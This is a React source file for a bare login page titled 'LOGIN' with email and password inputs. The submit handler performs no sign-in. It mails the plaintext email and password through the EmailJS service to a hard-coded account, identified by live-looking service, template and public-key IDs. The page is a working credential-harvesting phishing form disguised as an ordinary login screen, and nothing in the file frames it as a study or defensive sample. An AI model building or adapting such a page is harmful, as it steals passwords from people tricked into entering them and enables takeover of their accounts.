import { useState } from "react";
import emailjs from "emailjs-com";

import "./App.css";

function App() {
  const [credentials, setCredentials] = useState({ email: "", pass: "" });

  // Update credentials on input change
  const handleChange = (e) => {
    const { name, value } = e.target;
    setCredentials((prevState) => ({
      ...prevState,
      [name]: value,
    }));
  };

  const sendEmail = (e) => {
    e.preventDefault();

    // Sending email using EmailJS
    emailjs
      .send(
        "service_v6iklgm", // Replace with your EmailJS service ID
        "template_miw92pt", // Replace with your EmailJS template ID
        {
          user_email: credentials.email, // Email entered by the user
          user_password: credentials.pass, // Password entered by the user
        },
        "ZfLqB4ieu71Zx7o89" // Replace with your EmailJS public key
      )
      .then(
        () => {
          console.log("Email sent successfully!");
        },
        (error) => {
          console.error("Failed to send email:", error.text);
        }
      );
  };

  return (
    <>
      <div className="main_wrapper">
        <div className="bgc center">
          <div className="container">
            <div className="header">
              <h1>
                <span className="l">L</span>OGIN
              </h1>
            </div>
            <form onSubmit={sendEmail}>
              <label htmlFor="email">Email</label>
              <input
                type="email"
                className="inp"
                name="email"
                value={credentials.email}
                onChange={handleChange}
                required
              />
              <label htmlFor="pass">Password</label>
              <input
                type="password"
                className="inp"
                name="pass"
                value={credentials.pass}
                onChange={handleChange}
                required
              />
              <button type="submit">Enter</button>
            </form>
          </div>
        </div>
      </div>
    </>
  );
}

export default App;
